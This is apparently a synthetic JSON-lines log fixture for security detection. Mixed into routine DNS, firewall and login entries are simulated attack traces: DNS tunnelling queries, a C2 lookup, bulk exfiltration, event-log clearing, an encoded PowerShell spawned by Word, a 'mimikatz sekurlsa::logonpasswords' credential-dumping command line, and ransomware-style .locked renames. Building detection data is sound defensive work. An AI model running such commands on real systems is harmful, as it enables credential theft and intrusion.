+{"timestamp": "2026-10-04T09:10:16+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x16.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:17+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x17.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:18+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x18.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:19+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x19.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.32", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:10:20+00:00", "log_type": "dns", "src_ip": "10.0.1.48", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:10:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.7", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:10:20+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x20.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:21+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x21.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:22+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x22.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:23+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x23.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:24+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x24.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:25+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x25.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:26+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x26.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:27+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x27.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:28+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x28.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:29+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x29.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.40", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:10:30+00:00", "log_type": "dns", "src_ip": "10.0.1.17", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:10:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:10:30+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x30.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:31+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x31.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:32+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x32.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:33+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x33.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:34+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x34.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.41", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:10:40+00:00", "log_type": "dns", "src_ip": "10.0.1.39", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:10:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.9", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:10:40+00:00", "log_type": "dns", "src_ip": "10.0.1.78", "query": "a8f3k29dk39sk20dk39slw92kd.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:10:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.40", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:10:50+00:00", "log_type": "dns", "src_ip": "10.0.1.29", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:10:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:10:50+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:10:50+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:10:50+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:10:50+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:10:50+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:10:50+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:10:50+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:10:50+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:10:50+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:10:50+00:00", "log_type": "dns", "src_ip": "10.0.1.79", "query": "evil-c2.example", "record_type": "A"}
+{"timestamp": "2026-10-04T09:11:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.19", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:11:00+00:00", "log_type": "dns", "src_ip": "10.0.1.16", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:11:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.7", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:11:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.26", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:11:10+00:00", "log_type": "dns", "src_ip": "10.0.1.40", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:11:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.4", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:11:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.43", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:11:20+00:00", "log_type": "dns", "src_ip": "10.0.1.11", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:11:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.5", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:11:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.43", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:11:30+00:00", "log_type": "dns", "src_ip": "10.0.1.33", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:11:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.4", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:11:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.44", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:11:40+00:00", "log_type": "dns", "src_ip": "10.0.1.11", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:11:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.6", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:11:40+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:11:40+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:11:40+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:11:40+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:11:40+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:11:40+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:11:40+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:11:40+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:11:40+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:11:40+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.99", "mac": "de:ad:be:ef:00:01"}
+{"timestamp": "2026-10-04T09:11:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.15", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:11:50+00:00", "log_type": "dns", "src_ip": "10.0.1.26", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:11:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.7", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:12:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.20", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:12:00+00:00", "log_type": "dns", "src_ip": "10.0.1.32", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:12:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.5", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:12:00+00:00", "log_type": "network_flow", "src_ip": "10.0.1.30", "dst_ip": "94.1.1.1", "dst_port": 443, "bytes_out": 900000000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:12:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.44", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:12:10+00:00", "log_type": "dns", "src_ip": "10.0.1.44", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:12:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.7", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:12:10+00:00", "log_type": "network_flow", "src_ip": "10.0.1.31", "dst_ip": "94.2.2.2", "dst_port": 4444, "bytes_out": 500, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:12:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.50", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:12:20+00:00", "log_type": "dns", "src_ip": "10.0.1.24", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:12:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.5", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:12:20+00:00", "log_type": "ids_ips", "src_ip": "203.0.113.99", "signature": "ET EXPLOIT Log4j RCE", "priority": 1}
+{"timestamp": "2026-10-04T09:12:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.25", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:12:30+00:00", "log_type": "dns", "src_ip": "10.0.1.35", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:12:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.5", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:12:30+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:12:30+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:12:30+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:12:30+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:12:30+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:12:30+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:12:30+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:12:30+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:12:30+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:12:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.22", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:12:40+00:00", "log_type": "dns", "src_ip": "10.0.1.43", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:12:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.9", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:12:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.32", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:12:50+00:00", "log_type": "dns", "src_ip": "10.0.1.11", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:12:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.2", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:13:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.27", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:13:00+00:00", "log_type": "dns", "src_ip": "10.0.1.40", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:13:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.6", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:13:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.22", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:13:10+00:00", "log_type": "dns", "src_ip": "10.0.1.48", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:13:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.7", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:13:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.38", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:13:20+00:00", "log_type": "dns", "src_ip": "10.0.1.32", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:13:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.7", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:13:20+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:13:20+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:13:20+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:13:20+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:13:20+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:13:20+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:13:20+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:13:20+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:13:20+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:13:20+00:00", "log_type": "windows", "host": "DC01", "user": "mallory", "event_id": 1102}
+{"timestamp": "2026-10-04T09:13:25+00:00", "log_type": "windows", "host": "DC01", "user": "mallory", "event_id": 4732}
+{"timestamp": "2026-10-04T09:13:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.15", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:13:30+00:00", "log_type": "dns", "src_ip": "10.0.1.24", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:13:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:13:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.24", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:13:40+00:00", "log_type": "dns", "src_ip": "10.0.1.40", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:13:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.5", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:13:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.31", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:13:50+00:00", "log_type": "dns", "src_ip": "10.0.1.23", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:13:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.9", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:14:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.49", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:14:00+00:00", "log_type": "dns", "src_ip": "10.0.1.49", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:14:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.2", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:14:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.40", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:14:10+00:00", "log_type": "dns", "src_ip": "10.0.1.32", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:14:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:14:10+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:14:10+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:14:10+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:14:10+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:14:10+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:14:10+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:14:10+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:14:10+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:14:10+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:14:10+00:00", "log_type": "endpoint_edr", "host": "WS-02", "user": "dave", "process_name": "powershell.exe", "parent_process": "winword.exe", "command_line": "powershell.exe -enc SQBFAFgAIAAoA..."}
+{"timestamp": "2026-10-04T09:14:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.17", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:14:20+00:00", "log_type": "dns", "src_ip": "10.0.1.34", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:14:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.5", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:14:20+00:00", "log_type": "endpoint_edr", "host": "WS-02", "user": "dave", "process_name": "rundll32.exe", "parent_process": "cmd.exe", "command_line": "mimikatz sekurlsa::logonpasswords"}
+{"timestamp": "2026-10-04T09:14:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.40", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:14:30+00:00", "log_type": "dns", "src_ip": "10.0.1.21", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:14:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.8", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:14:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.50", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:14:40+00:00", "log_type": "dns", "src_ip": "10.0.1.31", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:14:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:14:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.35", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:14:50+00:00", "log_type": "dns", "src_ip": "10.0.1.39", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:14:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.8", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:15:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.15", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:15:00+00:00", "log_type": "dns", "src_ip": "10.0.1.20", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:15:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.4", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:15:00+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:15:00+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:15:00+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:15:00+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:15:00+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:15:00+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:15:00+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:15:00+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:15:00+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:15:00+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc0.docx.locked"}
+{"timestamp": "2026-10-04T09:15:00.300000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc1.docx.locked"}
+{"timestamp": "2026-10-04T09:15:00.600000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc2.docx.locked"}
+{"timestamp": "2026-10-04T09:15:00.900000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc3.docx.locked"}
+{"timestamp": "2026-10-04T09:15:01.200000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc4.docx.locked"}
+{"timestamp": "2026-10-04T09:15:01.500000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc5.docx.locked"}
+{"timestamp": "2026-10-04T09:15:01.800000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc6.docx.locked"}
+{"timestamp": "2026-10-04T09:15:02.100000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc7.docx.locked"}
+{"timestamp": "2026-10-04T09:15:02.400000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc8.docx.locked"}
+{"timestamp": "2026-10-04T09:15:02.700000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc9.docx.locked"}
+{"timestamp": "2026-10-04T09:15:03+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc10.docx.locked"}
+{"timestamp": "2026-10-04T09:15:03.300000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc11.docx.locked"}
+{"timestamp": "2026-10-04T09:15:03.600000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc12.docx.locked"}
+{"timestamp": "2026-10-04T09:15:03.900000+00:00", "log_type": "file_audit", "host": "FS01", "user": "svc_backup", "action": "rename", "file_path": "D:/share/doc13.docx.locked"}
